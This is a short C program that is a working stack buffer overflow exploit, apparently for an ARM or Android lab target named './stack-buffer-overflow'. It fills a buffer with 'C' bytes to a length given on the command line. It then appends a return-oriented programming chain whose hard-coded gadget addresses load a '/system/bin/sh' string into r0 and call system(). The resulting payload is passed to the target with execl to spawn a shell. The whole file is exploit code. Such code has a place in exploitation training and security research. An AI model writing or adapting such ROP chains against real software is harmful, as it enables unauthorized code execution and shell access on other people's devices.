#include <unistd.h>
#include <stdlib.h>

unsigned long rop[] = { 
  0x4001a9db,  	// pop	{r4, pc}
  0x4003cd3a,  	// "/system/bin/sh"
  0x4001a9d9,  	// mov	r0, r4
 		// pop  {r4, pc}
  0xcccccccc,
  0x4001c3a5,	// system()
  0
};
  
void main(int argc, char *argv[]) {
  unsigned long size = strtoul(argv[1], NULL, 10);
  char *payload = malloc(size + sizeof(rop));
  memset(payload, 'C', size);
  memcpy(payload + size, rop, sizeof(rop));
  execl("./stack-buffer-overflow", "./stack-buffer-overflow", payload, NULL);
}

